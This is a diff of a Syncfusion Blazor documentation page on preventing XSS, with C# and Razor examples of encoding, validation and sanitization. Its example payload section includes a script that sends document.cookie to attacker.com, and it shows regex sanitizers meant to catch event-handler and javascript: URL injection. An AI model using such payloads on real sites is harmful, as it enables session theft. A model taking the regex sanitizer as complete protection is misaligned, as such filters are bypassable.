@@ -50,15 +50,12 @@ Blazor Server and Blazor WebAssembly come with different types of XSS risks.
 
 ### Common Attack Vectors
 
-XSS can enter an application in many different ways. The most common source is user input, such as comments, chat messages, or any data that users type into forms.
-
-Data received from APIs, uploaded files, or text copied from other websites can also contain harmful scripts.
-
-Even information already stored in the database may be unsafe if it was not validated or sanitized before being saved.
+XSS can enter an application in many different ways. The most common source is user input, such as comments, chat messages, or any data that users type into forms. Data received from APIs, uploaded files, or text copied from other websites can also contain harmful scripts. Even information already stored in the database may be unsafe if it was not validated or sanitized before being saved.
 
 ### Example Attack Payloads
 
-```html
+{% tabs %}
+{% highlight html %}
 
 <!-- Script injection -->
 <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
@@ -75,7 +72,8 @@ Even information already stored in the database may be unsafe if it was not vali
 <!-- JavaScript protocol -->
 <a href="javascript:void(document.cookie='stolen')">Click here</a>
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 ## How to Prevent XSS Attacks
 
@@ -87,7 +85,8 @@ Blazor automatically turns special characters in user input into safe, readable 
 
 Use `@userInput` whenever you want to safely display text on the page. Only use `MarkupString` when the HTML has already been sanitized on the server.
 
-```html
+{% tabs %}
+{% highlight html %}
 
 @* Safe - Blazor automatically encodes *@
 <p>@userInput</p>
@@ -95,7 +94,8 @@ Use `@userInput` whenever you want to safely display text on the page. Only use 
 @* UNSAFE - Bypasses encoding; only safe if sanitized *@
 <p>@((MarkupString)userInput)</p>
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 ### 2. Input Validation
 
@@ -109,8 +109,8 @@ Follow these practices when validating input.
 - Block input that clearly contains suspicious or harmful content.
 - For file uploads, verify the file type, file size, and actual file content before processing.
 
-
-```csharp
+{% tabs %}
+{% highlight C# %}
 
 using System;
 using System.ComponentModel.DataAnnotations;
@@ -141,7 +141,8 @@ public sealed class SafeContentAttribute : ValidationAttribute
     }
 }
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 ### 3. HTML Sanitization
 
@@ -151,7 +152,7 @@ Only the HTML tags you explicitly allow are kept. Always sanitize content before
 
 #### Built-in Sanitization with Syncfusion<sup style="font-size:70%">&reg;</sup> Components
 
-The `EnableHtmlSanitizer` property is available in the Syncfusion<sup style="font-size:70%">&reg;</sup> **RichTextEditor** and **BlockEditor** components. It provides built-in client-side XSS protection.
+The [EnableHtmlSanitizer](https://help.syncfusion.com/cr/blazor/Syncfusion.Blazor.RichTextEditor.SfRichTextEditor.html#Syncfusion_Blazor_RichTextEditor_SfRichTextEditor_EnableHtmlSanitizer) property is available in the Syncfusion<sup style="font-size:70%">&reg;</sup> **[RichTextEditor](https://www.syncfusion.com/blazor-components/blazor-rich-text-editor)** and **[BlockEditor](https://www.syncfusion.com/blazor-components/blazor-block-editor)** components. It provides built-in client-side XSS protection.
 
 #### How EnableHtmlSanitizer Works
 
@@ -185,7 +186,8 @@ When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer d
 
 #### BlockEditor with EnableHtmlSanitizer
 
-```csharp
+{% tabs %}
+{% highlight razor %}
 
 @using Syncfusion.Blazor.BlockEditor;
 
@@ -210,11 +212,13 @@ When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer d
     };
 }
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 #### RichTextEditor with Client‑Side and Server‑Side Sanitization
 
-```csharp
+{% tabs %}
+{% highlight razor %}
 
 @using Syncfusion.Blazor.RichTextEditor
 @using System.Net.Http.Json
@@ -257,11 +261,12 @@ When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer d
     private Task StoreInDatabase(string cleanHtml) => Task.CompletedTask;
 }
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 ### Safe HTML Rendering in Data Components
 
-Components that display user-generated or database content, such as **DataGrid** and **ListView**, follow the same rule: only render HTML that has been sanitized on the server, or display plain text which Blazor encodes automatically.
+Components that display user-generated or database content, such as **[DataGrid](https://www.syncfusion.com/blazor-components/blazor-datagrid)** and **[ListView](https://www.syncfusion.com/blazor-components/blazor-listview)**, follow the same rule: only render HTML that has been sanitized on the server, or display plain text which Blazor encodes automatically.
 
 #### DataGrid Templates
 
@@ -273,7 +278,8 @@ The example below shows a scenario that should never be used. It renders raw HTM
 
 If the content includes malicious scripts, it can lead to `XSS (Cross‑Site Scripting)` attacks.
 
-```csharp
+{% tabs %}
+{% highlight razor %}
 
 @* NEVER DO THIS *@
 <SfGrid DataSource="@Comments">
@@ -289,7 +295,8 @@ If the content includes malicious scripts, it can lead to `XSS (Cross‑Site Scr
     </GridColumns>
 </SfGrid>
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 #### SAFE - Sanitized MarkupString (Server-Side Sanitization via API)
 
@@ -297,7 +304,8 @@ In this example, the HTML content is cleaned and sanitized on the server before 
 
 The `SanitizedContent` property contains only safe HTML, so rendering it with `MarkupString` is secure.
 
-```csharp
+{% tabs %}
+{% highlight razor %}
 
 @using System.Net.Http.Json
 @inject HttpClient Http
@@ -333,13 +341,15 @@ public class Comment
     public DateTime CreatedAt { get; set; }
 }
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 #### Alternative - Text-Only Rendering
 
 If HTML formatting is not required, render the content as plain text. Blazor automatically encodes all special characters, ensuring no injected scripts can execute regardless of what the data source contains.
 
-```csharp
+{% tabs %}
+{% highlight razor %}
 
 <SfGrid DataSource="@Comments">
     <GridColumns>
@@ -351,7 +361,8 @@ If HTML formatting is not required, render the content as plain text. Blazor aut
     </GridColumns>
 </SfGrid>
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 #### ListView with Custom Templates
 
@@ -359,7 +370,8 @@ The same safe rendering rules apply to ListView when displaying user-generated c
 
 The following example conditionally renders content based on whether the message contains HTML. When `IsHtml` is `true`, only pre-sanitized content stored in `SanitizedContent` is rendered as markup. Otherwise, plain text is displayed using Blazor's automatic encoding. This keeps all messages safe regardless of their format.
 
-```csharp
+{% tabs %}
+{% highlight razor %}
 
 @using Syncfusion.Blazor.Lists
 
@@ -403,7 +415,8 @@ The following example conditionally renders content based on whether the message
     }
 }
 
-```
+{% endhighlight %}
+{% endtabs %}
 
 ## Server-Side Sanitization (Authoritative)
 
@@ -421,16 +434,21 @@ The `System.Text.Encodings.Web` namespace is part of the .NET SDK, so no additio
 
 ### Server-Side Sanitization Example
 
-```csharp
+{% tabs %}
+{% highlight c# tabtitle="ContentService.cs"  %}
 
+using System;
+using System.Collections.Generic;
+using System.Linq;
 using System.Text.Encodings.Web;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 
 public class ContentService
 {
     private readonly AppDbContext _context;
 
-    // Allow-list of safe HTML tags
+    // Allow-list of safe HTML tags (adjust to your needs)
     private static readonly string[] AllowedTags =
     {
         "p", "br", "strong", "em", "u", "ol", "ul", "li",
@@ -442,34 +460,50 @@ public class ContentService
         _context = context;
     }
 
-    /// <summary>Strips all tags not in the allow-list and removes dangerous attributes.</summary>
+    /// <summary>
+    /// Strips all tags not in the allow-list and removes dangerous attributes.
+    /// </summary>
     public string SanitizeHtml(string input)
     {
         if (string.IsNullOrEmpty(input))
             return string.Empty;
 
-        // Remove tags outside allow-list
-        var tagPattern = $@"<(?!/?(?:{string.Join("|", AllowedTags)})\b)[^>]*>";
-        var result = Regex.Replace(input, tagPattern, string.Empty, RegexOptions.IgnoreCase);
+        // 1) Remove tags outside the allow-list
+        var allowList = string.Join("|", AllowedTags);
+        var result = Regex.Replace(
+            input,
+            $@"</?(?!(?:{allowList})\b)[^>]*>",
+            string.Empty,
+            RegexOptions.IgnoreCase
+        );
 
-        // Remove event handler attributes
-        result = Regex.Replace(result, @"\s+on\w+\s*=\s*(""[^""]*""|'[^']*')", string.Empty, RegexOptions.IgnoreCase);
+        // 2) Remove on* event handler attributes (onclick, onerror, onload, etc.)
+        result = Regex.Replace(
+            result,
+            @"\s+on\w+\s*=\s*(?:""[^""]*""|'[^']*'|[^\s>]+)",
+            string.Empty,
+            RegexOptions.IgnoreCase
+        );
 
-        // Remove javascript: protocol in href/src
-        result = Regex.Replace(result, @"(href|src)\s*=\s*[""']?\s*javascript:[^""'>]*[""']?",
-            string.Empty, RegexOptions.IgnoreCase);
+        // 3) Remove javascript: from href/src attributes (drop the entire attribute)
+        result = Regex.Replace(
+            result,
+            @"\s*(href|src)\s*=\s*([""'])\s*javascript:[^""']*\2",
+            string.Empty,
+            RegexOptions.IgnoreCase
+        );
 
         return result;
     }
 
-    /// <summary>Fully encodes input — use for plain text fields.</summary>
+    /// <summary>Fully encodes input — use for plain-text fields.</summary>
     public string EncodeText(string input)
         => HtmlEncoder.Default.Encode(input ?? string.Empty);
 
-    // Sanitize before storing
+    // Demo methods showing how to sanitize on write and re-sanitize on read.
     public async Task<BlogPost> CreatePostAsync(BlogPost post)
     {
-        post.Title   = EncodeText(post.Title);
+        post.Title = EncodeText(post.Title);
         post.Content = SanitizeHtml(post.Content);
         post.Summary = EncodeText(post.Summary);
 
@@ -479,70 +513,240 @@ public class ContentService
         return post;
     }
 
-    // Sanitize when retrieving (defense-in-depth)
-    public async Task<BlogPost> GetPostAsync(int id)
+    public async Task<BlogPost?> GetPostAsync(int id)
     {
-        var post = await _context.BlogPosts.FindAsync(id);
+        var post = await _context.FindAsync(id);
         if (post != null)
         {
+            // Defense-in-depth: sanitize again on read
             post.Content = SanitizeHtml(post.Content);
         }
         return post;
     }
 }
 
-```
+{% endhighlight %}
 
-### API Controller Example
+{% highlight c# tabtitle="~Models/AppDbContext.cs" %}
 
-```csharp
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
 
-using System.Text.Encodings.Web;
-using System.Text.RegularExpressions;
-
-[ApiController]
-[Route("api/[controller]")]
-public class CommentsController : ControllerBase
+namespace XssApiDemo.Models
 {
-    private readonly CommentRepository _repository;
-
-    public CommentsController(CommentRepository repository)
+    /// <summary>
+    /// Minimal in-memory store for documentation/demo purposes.
+    /// Replace with your real EF Core DbContext in production.
+    /// </summary>
+    public class AppDbContext
     {
-        _repository = repository;
-    }
+        public List<BlogPost> BlogPosts { get; } = new();
 
-    [HttpPost]
-    public async Task<IActionResult> CreateComment([FromBody] CommentDto dto)
-    {
-        // Server-side validation
-        if (string.IsNullOrWhiteSpace(dto.Content))
-        {
-            return BadRequest("Content is required");
-        }
+        public Task SaveChangesAsync() => Task.CompletedTask;
 
-        // Sanitize before storing
-        var comment = new Comment
-        {
-            Author    = HtmlEncoder.Default.Encode(dto.Author),
-            Content   = SanitizeAllowedTags(dto.Content),
-            CreatedAt = DateTime.UtcNow
-        };
-
-        await _repository.AddAsync(comment);
-        return Ok(comment);
-    }
-
-    private static string SanitizeAllowedTags(string input)
-    {
-        if (string.IsNullOrEmpty(input)) return string.Empty;
-
-        var allowed = new[] { "p", "br", "b", "i", "u" };
-        var pattern = $@"<(?!/?(?:{string.Join("|", allowed)})\b)[^>]*>";
-        var result  = Regex.Replace(input, pattern, string.Empty, RegexOptions.IgnoreCase);
-
-        result = Regex.Replace(result, @"\s+on\w+\s*=\s*(""[^""]*""|'[^']*')", string.Empty, RegexOptions.IgnoreCase);
-        return result;
+        public Task<BlogPost?> FindAsync(int id)
+            => Task.FromResult(BlogPosts.FirstOrDefault(p => p.Id == id));
     }
 }
 
-``` 
+{% endhighlight %}
+
+{% highlight c# tabtitle="~Models/BlogPost.cs" %}
+
+namespace XssApiDemo.Models
+{
+    public class BlogPost
+    {
+        public int Id { get; set; }
+        public string Title { get; set; } = "";
+        public string Summary { get; set; } = "";
+        public string Content { get; set; } = "";
+    }
+}
+
+{% endhighlight %}
+{% endtabs %}
+
+### API Controller Example
+
+{% tabs %}
+{% highlight c# tabtitle="~Controllers/CommentsController.cs"  %}
+
+using System;
+using System.Text.Encodings.Web;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Mvc;
+using XssApiDemo.Models;
+
+namespace XssApiDemo.Controllers
+{
+    [ApiController]
+    [Route("api/[controller]")]
+    public class CommentsController : ControllerBase
+    {
+        private readonly ICommentRepository _repository;
+
+        public CommentsController(ICommentRepository repository)
+        {
+            _repository = repository;
+        }
+
+        /// <summary>
+        /// Accepts a comment, encodes plain-text fields, sanitizes limited HTML fields, and stores the safe result.
+        /// </summary>
+        [HttpPost]
+        public async Task<IActionResult> CreateComment([FromBody] CommentDto dto)
+        {
+            if (dto is null || string.IsNullOrWhiteSpace(dto.Content))
+                return BadRequest("Content is required");
+
+            var comment = new Comment
+            {
+                // Treat author as plain text — fully encode it
+                Author = HtmlEncoder.Default.Encode(dto.Author ?? string.Empty),
+
+                // Content may contain limited HTML — sanitize it
+                Content = SanitizeAllowedTags(dto.Content),
+
+                CreatedAt = DateTime.UtcNow
+            };
+
+            await _repository.AddAsync(comment);
+            return Ok(comment);
+        }
+
+        /// <summary>
+        /// Lists all stored comments (already sanitized at write-time).
+        /// </summary>
+        [HttpGet]
+        public async Task<IActionResult> GetAll()
+            => Ok(await _repository.GetAllAsync());
+
+        /// <summary>
+        /// Keep an allow-list of simple tags, remove event attributes, and strip javascript: URLs.
+        /// </summary>
+        private static string SanitizeAllowedTags(string input)
+        {
+            if (string.IsNullOrEmpty(input)) return string.Empty;
+
+            var allowed = new[] { "p", "br", "b", "i", "u", "strong", "em", "a", "img", "ul", "ol", "li", "blockquote" };
+            var allowList = string.Join("|", allowed);
+
+            // 1) Remove tags outside the allow-list
+            var result = Regex.Replace(
+                input,
+                $@"</?(?!(?:{allowList})\b)[^>]*>",
+                string.Empty,
+                RegexOptions.IgnoreCase
+            );
+
+            // 2) Remove inline event handlers like onclick=, onerror=, onload=...
+            result = Regex.Replace(
+                result,
+                @"\s+on\w+\s*=\s*(?:""[^""]*""|'[^']*'|[^\s>]+)",
+                string.Empty,
+                RegexOptions.IgnoreCase
+            );
+
+            // 3) Remove javascript: URLs in href/src attributes
+            result = Regex.Replace(
+                result,
+                @"\s*(href|src)\s*=\s*([""'])\s*javascript:[^""']*\2",
+                string.Empty,
+                RegexOptions.IgnoreCase
+            );
+
+            return result;
+        }
+    }
+}
+
+
+{% endhighlight %}
+
+{% highlight c# tabtitle="~Models/Comment.cs" %}
+
+using System;
+
+namespace XssApiDemo.Models
+{
+    public class Comment
+    {
+        public int Id { get; set; }               // Assigned by repository
+        public string Author { get; set; } = "";  // Fully HTML-encoded
+        public string Content { get; set; } = ""; // Sanitized (allow-list)
+        public DateTime CreatedAt { get; set; }   // UTC timestamp
+    }
+}
+
+
+{% endhighlight %}
+
+{% highlight c# tabtitle="~Models/CommentDto.cs" %}
+
+namespace XssApiDemo.Models
+{
+    /// <summary>
+    /// Incoming payload for comment creation.
+    /// Author is plain text (encoded).
+    /// Content may include limited HTML (sanitized).
+    /// </summary>
+    public class CommentDto
+    {
+        public string Author { get; set; } = "";
+        public string Content { get; set; } = "";
+    }
+}
+
+
+{% endhighlight %}
+
+{% highlight c# tabtitle="~Models/ICommentRepository.cs" %}
+
+using System.Collections.Generic;
+using System.Threading.Tasks;
+
+namespace XssApiDemo.Models
+{
+    public interface ICommentRepository
+    {
+        Task AddAsync(Comment comment);
+        Task<List<Comment>> GetAllAsync();
+    }
+}
+
+{% endhighlight %}
+
+{% highlight c# tabtitle="~Models/InMemoryCommentRepository.cs" %}
+
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+
+namespace XssApiDemo.Models
+{
+    /// <summary>
+    /// Simple in-memory repository for documentation/testing.
+    /// Replace with EF Core / database repository in real applications.
+    /// </summary>
+    public class InMemoryCommentRepository : ICommentRepository
+    {
+        private readonly List<Comment> _items = new();
+
+        public Task AddAsync(Comment comment)
+        {
+            comment.Id = _items.Count + 1;
+            _items.Add(comment);
+            return Task.CompletedTask;
+        }
+
+        public Task<List<Comment>> GetAllAsync()
+            => Task.FromResult(_items.ToList());
+    }
+}
+
+
+{% endhighlight %}
+{% endtabs %}
